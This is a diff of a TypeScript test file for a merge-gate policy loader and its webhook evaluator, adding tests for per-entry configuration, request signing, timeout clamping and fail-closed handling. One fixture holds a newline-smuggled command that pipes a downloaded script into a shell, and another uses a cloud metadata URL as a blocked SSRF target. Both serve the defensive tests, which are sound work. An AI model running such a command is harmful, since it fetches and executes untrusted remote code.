@@ -1,6 +1,13 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
 import { CompositeEvaluator } from "../src/evaluation/composite-evaluator";
 import { DiffEvaluator } from "../src/evaluation/diff-evaluator";
+import {
+  MAX_COMMAND_LENGTH,
+  MAX_PHASE_TIMEOUT_MS,
+  MAX_TOTAL_BUDGET_MS,
+  MIN_PHASE_TIMEOUT_MS,
+  MIN_TOTAL_BUDGET_MS,
+} from "../src/evaluation/limits";
 import { loadPolicy } from "../src/evaluation/policy-loader";
 import type { EvalPolicy, Evaluator } from "../src/evaluation/types";
 import { WebhookEvaluator } from "../src/evaluation/webhook-evaluator";
@@ -173,7 +180,17 @@ describe("DiffEvaluator", () => {
 });
 
 describe("WebhookEvaluator", () => {
-  const evaluator = new WebhookEvaluator();
+  /**
+   * Build the evaluator the way `buildEvaluators` does now: bound to the entry
+   * it evaluates (#336), rather than handed a policy to search at evaluation
+   * time. Takes the entry from the same policy the test passes in, so tests
+   * that vary `secret` or `timeoutMs` still exercise them.
+   */
+  const webhookFor = (policy: EvalPolicy): WebhookEvaluator => {
+    const entry = policy.evaluators.find((e) => e.type === "webhook");
+    if (entry?.type !== "webhook") throw new Error("test policy declares no webhook evaluator");
+    return new WebhookEvaluator(entry);
+  };
 
   beforeEach(() => {
     vi.restoreAllMocks();
@@ -193,7 +210,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (result.success) {
       expect(result.data.passed).toBe(true);
@@ -215,7 +232,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (result.success) {
       expect(result.data.passed).toBe(false);
@@ -231,7 +248,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "http://169.254.169.254/latest/meta-data" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (result.success) {
       expect(result.data.passed).toBe(false);
@@ -255,7 +272,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(capturedInit.redirect).toBe("manual");
     expect(result.success).toBe(true);
     if (result.success) {
@@ -269,7 +286,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval", timeoutMs: 1 }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(false);
     if (!result.success) {
       expect(result.error.message).toContain("The operation was aborted");
@@ -293,10 +310,90 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "mysecret" }],
     });
-    await evaluator.evaluate("diff content", policy, mockLogger);
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger);
 
     expect(capturedHeaders["X-Stratum-Signature"]).toBeDefined();
     expect(capturedHeaders["X-Stratum-Signature"]).toMatch(/^sha256=[0-9a-f]{64}$/);
+  });
+
+  it("#274: sends the base commit the diff was computed against", async () => {
+    let capturedBody = "";
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
+        capturedBody = init.body as string;
+        return Promise.resolve({
+          ok: true,
+          status: 200,
+          json: async () => ({ score: 1, passed: true, reason: "ok" }),
+        });
+      }),
+    );
+
+    const policy = makePolicy({
+      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
+    });
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
+      baseSha: "base_abc123",
+    });
+
+    const body = JSON.parse(capturedBody);
+    expect(body.baseSha).toBe("base_abc123");
+    expect(body.diff).toBe("diff content");
+  });
+
+  it("#274: omits baseSha rather than guessing when the caller has no base", async () => {
+    let capturedBody = "";
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
+        capturedBody = init.body as string;
+        return Promise.resolve({
+          ok: true,
+          status: 200,
+          json: async () => ({ score: 1, passed: true, reason: "ok" }),
+        });
+      }),
+    );
+
+    const policy = makePolicy({
+      evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
+    });
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {});
+
+    const body = JSON.parse(capturedBody);
+    // Absent, not null and not a stand-in value: a receiver can act on the
+    // absence, but cannot be misled by a base that was never verified.
+    expect(body).not.toHaveProperty("baseSha");
+  });
+
+  it("#274: baseSha is covered by the request signature", async () => {
+    const bodies: string[] = [];
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
+        bodies.push(init.body as string);
+        return Promise.resolve({
+          ok: true,
+          status: 200,
+          json: async () => ({ score: 1, passed: true, reason: "ok" }),
+        });
+      }),
+    );
+
+    const policy = makePolicy({
+      evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "mysecret" }],
+    });
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
+      baseSha: "base_abc123",
+    });
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger, {
+      baseSha: "base_def456",
+    });
+
+    // The signature is computed over the serialized body, so a tampered base
+    // cannot be swapped in transit without invalidating it.
+    expect(bodies[0]).not.toBe(bodies[1]);
   });
 
   it("fails closed with a generic reason when URL validation reports no detail", async () => {
@@ -307,27 +404,12 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (result.success) {
       expect(result.data.passed).toBe(false);
       expect(result.data.score).toBe(0);
       expect(result.data.reason).toContain("invalid URL");
-    }
-    expect(fetchSpy).not.toHaveBeenCalled();
-  });
-
-  it("fails closed when no webhook configuration is present", async () => {
-    const fetchSpy = vi.fn();
-    vi.stubGlobal("fetch", fetchSpy);
-
-    const policy = makePolicy({ evaluators: [{ type: "diff" }] });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
-    expect(result.success).toBe(true);
-    if (result.success) {
-      expect(result.data.passed).toBe(false);
-      expect(result.data.score).toBe(0);
-      expect(result.data.reason).toContain("no configuration");
     }
     expect(fetchSpy).not.toHaveBeenCalled();
   });
@@ -348,7 +430,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (!result.success) throw new Error("unreachable");
     return result.data;
@@ -407,7 +489,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(true);
     if (result.success) {
       expect(result.data.passed).toBe(false);
@@ -439,7 +521,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval" }],
     });
-    const result = await evaluator.evaluate("diff content", policy, mockLogger);
+    const result = await webhookFor(policy).evaluate("diff content", policy, mockLogger);
     expect(result.success).toBe(false);
     if (!result.success) {
       expect(result.error.message).toContain("socket hangup");
@@ -463,7 +545,7 @@ describe("WebhookEvaluator", () => {
     const policy = makePolicy({
       evaluators: [{ type: "webhook", url: "https://example.com/eval", secret: "super-secret" }],
     });
-    await evaluator.evaluate("diff content", policy, mockLogger);
+    await webhookFor(policy).evaluate("diff content", policy, mockLogger);
 
     expect(capturedBody).not.toContain("super-secret");
     expect(capturedBody).not.toContain("secret");
@@ -472,6 +554,86 @@ describe("WebhookEvaluator", () => {
     expect(payload.policy.evaluators).toEqual([
       { type: "webhook", url: "https://example.com/eval" },
     ]);
+  });
+
+  it("#336: each entry's evaluator posts to its own URL, with its own secret", async () => {
+    const calls: Array<{ url: string; signature: string | undefined }> = [];
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockImplementation((url: string, init: RequestInit) => {
+        calls.push({
+          url,
+          signature: (init.headers as Record<string, string>)["X-Stratum-Signature"],
+        });
+        return Promise.resolve({
+          ok: true,
+          status: 200,
+          json: async () => ({ score: 1, passed: true, reason: "ok" }),
+        });
+      }),
+    );
+
+    const policy = makePolicy({
+      evaluators: [
+        { type: "webhook", url: "https://ci-a.example.com/eval", secret: "secret-a" },
+        { type: "webhook", url: "https://ci-b.example.com/eval", secret: "secret-b" },
+      ],
+    });
+
+    // What `buildEvaluators` produces: one instance per entry. Before #336 both
+    // instances re-derived their config with a `find`, so both POSTed to ci-a
+    // signed with secret-a and ci-b was never contacted at all.
+    for (const entry of policy.evaluators) {
+      if (entry.type !== "webhook") continue;
+      await new WebhookEvaluator(entry).evaluate("diff content", policy, mockLogger);
+    }
+
+    expect(calls.map((c) => c.url)).toEqual([
+      "https://ci-a.example.com/eval",
+      "https://ci-b.example.com/eval",
+    ]);
+    // Distinct secrets sign distinct HMACs over an otherwise identical body.
+    expect(calls[0]?.signature).toMatch(/^sha256=[0-9a-f]{64}$/);
+    expect(calls[1]?.signature).toMatch(/^sha256=[0-9a-f]{64}$/);
+    expect(calls[0]?.signature).not.toBe(calls[1]?.signature);
+  });
+
+  it("#336: uses its own entry's timeoutMs, not the first entry's", async () => {
+    const signals: Array<AbortSignal | undefined> = [];
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockImplementation((_url: string, init: RequestInit) => {
+        signals.push(init.signal ?? undefined);
+        // Never settles on its own: the only thing that ends this request is the
+        // evaluator's own timer firing on its own entry's budget.
+        return new Promise((_resolve, reject) => {
+          init.signal?.addEventListener("abort", () => reject(new Error("aborted")));
+        });
+      }),
+    );
+
+    vi.useFakeTimers();
+    try {
+      const policy = makePolicy({
+        evaluators: [
+          { type: "webhook", url: "https://ci-a.example.com/eval", timeoutMs: 60000 },
+          { type: "webhook", url: "https://ci-b.example.com/eval", timeoutMs: 1000 },
+        ],
+      });
+      const second = policy.evaluators[1];
+      if (second?.type !== "webhook") throw new Error("unreachable");
+
+      const pending = new WebhookEvaluator(second).evaluate("diff content", policy, mockLogger);
+      await vi.advanceTimersByTimeAsync(1000);
+      const result = await pending;
+
+      // Aborted at its own 1s budget. Under the first entry's 60s it would
+      // still be in flight here.
+      expect(result.success).toBe(false);
+      expect(signals[0]?.aborted).toBe(true);
+    } finally {
+      vi.useRealTimers();
+    }
   });
 });
 
@@ -754,5 +916,300 @@ describe("loadPolicy", () => {
     expect(policy.minScore).toBe(0.4);
     expect(policy.evaluators[0]).toMatchObject({ type: "diff", maxLines: 42 });
     expect(mockReadFileFromRepo).toHaveBeenCalledTimes(1);
+  });
+});
+
+describe("loadPolicy — evaluator sanitization", () => {
+  beforeEach(() => {
+    mockReadFileFromRepo.mockReset();
+  });
+
+  /** Loads `config` as the YAML policy file. */
+  async function loadConfig(config: unknown): Promise<EvalPolicy> {
+    mockReadFileFromRepo.mockResolvedValue({ success: true, data: JSON.stringify(config) });
+    return loadPolicy("https://repo.example.com", "tok", mockLogger);
+  }
+
+  function sandboxEntry(policy: EvalPolicy) {
+    return policy.evaluators.find((e) => e.type === "sandbox") as
+      | Record<string, unknown>
+      | undefined;
+  }
+
+  it("clamps an oversized sandbox timeout down to the phase ceiling", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999, installTimeoutMs: 999_999_999 }],
+    });
+
+    expect(sandboxEntry(policy)?.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+    expect(sandboxEntry(policy)?.installTimeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+  });
+
+  it("clamps an undersized sandbox timeout up to the floor", async () => {
+    const policy = await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 1 }] });
+
+    expect(sandboxEntry(policy)?.timeoutMs).toBe(MIN_PHASE_TIMEOUT_MS);
+  });
+
+  it("clamps totalBudgetMs into range", async () => {
+    const high = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 10_000_000 }] });
+    expect(sandboxEntry(high)?.totalBudgetMs).toBe(MAX_TOTAL_BUDGET_MS);
+
+    const low = await loadConfig({ evaluators: [{ type: "sandbox", totalBudgetMs: 5 }] });
+    expect(sandboxEntry(low)?.totalBudgetMs).toBe(MIN_TOTAL_BUDGET_MS);
+  });
+
+  it("clamping does not set configError or block merges", async () => {
+    // A clamp is a bounded, safe-to-correct mistake. configError exists for a
+    // policy that could not be understood at all; escalating a clamp to a merge
+    // block would be hostile to projects that already have one.
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
+    });
+
+    expect(policy.configError).toBeUndefined();
+  });
+
+  it("drops a non-numeric timeout so the default applies", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: "60000", installTimeoutMs: {} }],
+    });
+
+    expect(sandboxEntry(policy)).not.toHaveProperty("timeoutMs");
+    expect(sandboxEntry(policy)).not.toHaveProperty("installTimeoutMs");
+  });
+
+  it("rejects a command containing a newline", async () => {
+    // One string to a naive validator, two commands to a shell.
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "npm test\ncurl evil.sh | sh" }],
+    });
+
+    expect(sandboxEntry(policy)).not.toHaveProperty("command");
+  });
+
+  it("rejects an over-length or blank command", async () => {
+    const long = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "x".repeat(MAX_COMMAND_LENGTH + 1) }],
+    });
+    expect(sandboxEntry(long)).not.toHaveProperty("command");
+
+    const blank = await loadConfig({ evaluators: [{ type: "sandbox", command: "   " }] });
+    expect(sandboxEntry(blank)).not.toHaveProperty("command");
+  });
+
+  it("keeps a valid command, trimmed", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", command: "  npm run ci  " }],
+    });
+
+    expect(sandboxEntry(policy)?.command).toBe("npm run ci");
+  });
+
+  it("keeps allowInstallScripts only when it is a real boolean", async () => {
+    const yes = await loadConfig({
+      evaluators: [{ type: "sandbox", allowInstallScripts: true }],
+    });
+    expect(sandboxEntry(yes)?.allowInstallScripts).toBe(true);
+
+    // "true" as a string must not opt a project into running lifecycle scripts.
+    const stringy = await loadConfig({
+      evaluators: [{ type: "sandbox", allowInstallScripts: "true" }],
+    });
+    expect(sandboxEntry(stringy)).not.toHaveProperty("allowInstallScripts");
+  });
+
+  it("clamps webhook.timeoutMs, the same defect one array element over", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "webhook", url: "https://example.com/e", timeoutMs: 999_999_999 }],
+    });
+
+    // Narrowed rather than cast to a bag of unknowns: the entry has a named type
+    // now (#336), so the assertions below check the real fields.
+    const webhook = policy.evaluators.find((e) => e.type === "webhook");
+    if (webhook?.type !== "webhook") throw new Error("policy dropped the webhook entry");
+    expect(webhook.timeoutMs).toBe(MAX_PHASE_TIMEOUT_MS);
+    expect(webhook.url).toBe("https://example.com/e");
+  });
+
+  it("clamps minScore into [0, 1] so the gate cannot be disabled by a number", async () => {
+    const low = await loadConfig({ evaluators: [{ type: "diff" }], minScore: -5 });
+    expect(low.minScore).toBe(0);
+
+    const high = await loadConfig({ evaluators: [{ type: "diff" }], minScore: 42 });
+    expect(high.minScore).toBe(1);
+  });
+
+  it("does not crash buildEvaluators on entries that are not objects", async () => {
+    // The array guard only checks Array.isArray, so these used to reach the
+    // evaluator builders and throw on `.type` access. They are now rejected,
+    // and because entries were dropped the gate fails closed.
+    const policy = await loadConfig({
+      evaluators: [null, "sandbox", {}, 42, [], { type: "diff", maxLines: 10 }],
+    });
+
+    expect(policy.configError).toBeDefined();
+    // Evaluation still runs on the defaults so the change flow is not broken.
+    expect(policy.evaluators).toEqual([{ type: "diff" }]);
+  });
+
+  it("fails closed when one entry is dropped but its siblings survive", async () => {
+    // The fail-open shape this guards: a typo'd webhook url used to reach
+    // WebhookEvaluator and block the merge. Dropping the entry while `diff`
+    // survives would silently remove that gate and let the change through on
+    // the remaining one.
+    const policy = await loadConfig({
+      evaluators: [{ type: "webhook" }, { type: "diff" }],
+    });
+
+    expect(policy.configError).toBeDefined();
+    expect(policy.configError).toMatch(/unusable/i);
+  });
+
+  it("does not fail closed for an unrecognized evaluator type", async () => {
+    // A policy naming a future or misspelled evaluator type is copied through
+    // and rejected downstream by buildEvaluators, so it must not trip the
+    // dropped-entry check.
+    const policy = await loadConfig({
+      evaluators: [{ type: "future_evaluator" }, { type: "diff" }],
+    });
+
+    expect(policy.configError).toBeUndefined();
+    expect(policy.evaluators).toHaveLength(2);
+  });
+
+  it("preserves evaluator types it does not clamp", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "llm", model: "m", threshold: 0.5 }],
+    });
+
+    expect(policy.evaluators[0]).toMatchObject({ type: "llm", model: "m", threshold: 0.5 });
+  });
+
+  it("never mutates the module-level default policy", async () => {
+    // The loader shallow-spreads DEFAULT_POLICY, so a sanitizer that clamped in
+    // place would poison the default for the isolate's lifetime — across
+    // requests and across tenants.
+    await loadConfig({ evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }] });
+
+    mockReadFileFromRepo.mockResolvedValue({
+      success: false,
+      error: new AppError("missing", "NOT_FOUND", 404),
+    });
+    const fallback = await loadPolicy("https://repo.example.com", "tok", mockLogger);
+
+    expect(fallback.evaluators).toEqual([{ type: "diff" }]);
+  });
+
+  /** Loads a literal YAML document, for values JSON cannot express. */
+  async function loadYaml(yaml: string): Promise<EvalPolicy> {
+    mockReadFileFromRepo.mockResolvedValue({ success: true, data: yaml });
+    return loadPolicy("https://repo.example.com", "tok", mockLogger);
+  }
+
+  it("replaces a minScore it rejected instead of leaving the raw value in place", async () => {
+    // The spread puts the raw value in `policy.minScore` before validation, so
+    // a rejection that only skips the assignment leaves the bad value behind.
+    // `-Infinity` makes `score >= minScore` true for every score — including a
+    // sandbox verdict of 0 — which disables the gate entirely.
+    const negInfinity = await loadYaml(
+      ["evaluators:", "  - type: diff", "minScore: -.inf"].join("\n"),
+    );
+    expect(negInfinity.minScore).toBe(0.7);
+
+    const nan = await loadYaml(["evaluators:", "  - type: diff", "minScore: .nan"].join("\n"));
+    expect(nan.minScore).toBe(0.7);
+
+    // A string compares by coercion: `0.1 >= "-5"` is true.
+    const stringy = await loadConfig({ evaluators: [{ type: "diff" }], minScore: "-5" });
+    expect(stringy.minScore).toBe(0.7);
+  });
+
+  it("fails closed, not open, when a YAML alias cycle appears in a policy", async () => {
+    // A circular structure throws inside JSON.stringify, which is reached while
+    // *logging* a rejected entry. That throw used to escape to the outer
+    // handler, which treats a file as absent — so a policy declaring two
+    // required approvals silently became the permissive default with **no**
+    // configError, dropping the approval requirement and re-enabling
+    // force-merge. Logging must never decide whether a policy loads.
+    //
+    // The file is still malformed (the self-referencing entry is unusable), so
+    // the outcome is a blocked merge rather than a loaded policy — which is the
+    // safe direction, and the opposite of what it used to do.
+    const policy = await loadYaml(
+      [
+        "merge:",
+        "  requiredApprovals: 2",
+        "  allowForce: false",
+        "evaluators: &e",
+        "  - type: sandbox",
+        "  - *e",
+      ].join("\n"),
+    );
+
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("fails closed when a policy names evaluators but none survive sanitization", async () => {
+    // Falling through with an empty array would leave only the always-on secret
+    // scan, which passes a clean diff — so a policy the author meant as a gate
+    // would accept the change.
+    const policy = await loadConfig({ evaluators: [null, "sandbox", 42] });
+
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("drops a webhook entry with no url", async () => {
+    const policy = await loadConfig({ evaluators: [{ type: "webhook" }] });
+
+    // Dropped, and therefore failing closed rather than loading a gate-less
+    // policy.
+    expect(policy.configError).toBeDefined();
+  });
+
+  it("does not fail closed for a genuinely empty evaluators array", async () => {
+    // Distinct from the case above: the author declared no evaluators, which
+    // already behaved this way and is not a misunderstanding of the file.
+    const policy = await loadConfig({ evaluators: [] });
+
+    expect(policy.configError).toBeUndefined();
+  });
+
+  it("keeps a webhook's url and secret while clamping its timeout", async () => {
+    const policy = await loadConfig({
+      evaluators: [
+        { type: "webhook", url: "https://e.example/x", secret: "s", timeoutMs: 999_999_999 },
+      ],
+    });
+
+    expect(policy.evaluators[0]).toEqual({
+      type: "webhook",
+      url: "https://e.example/x",
+      secret: "s",
+      timeoutMs: MAX_PHASE_TIMEOUT_MS,
+    });
+  });
+
+  it("warns about an unrecognized sandbox field instead of dropping it silently", async () => {
+    // `timeout` for `timeoutMs` is the typo most likely to be made and least
+    // likely to be noticed, since the whitelist rebuild discards it.
+    const warn = vi.mocked(mockLogger.warn);
+    warn.mockClear();
+
+    await loadConfig({ evaluators: [{ type: "sandbox", timeout: 60_000 }] });
+
+    expect(warn).toHaveBeenCalledWith(
+      "Ignoring unrecognized sandbox evaluator field",
+      expect.objectContaining({ field: "timeout" }),
+    );
+  });
+
+  it("returns an evaluators array that does not alias the parsed input", async () => {
+    const policy = await loadConfig({
+      evaluators: [{ type: "sandbox", timeoutMs: 999_999_999 }],
+    });
+    const second = await loadConfig({ evaluators: [{ type: "diff" }] });
+
+    expect(policy.evaluators).not.toBe(second.evaluators);
   });
 });
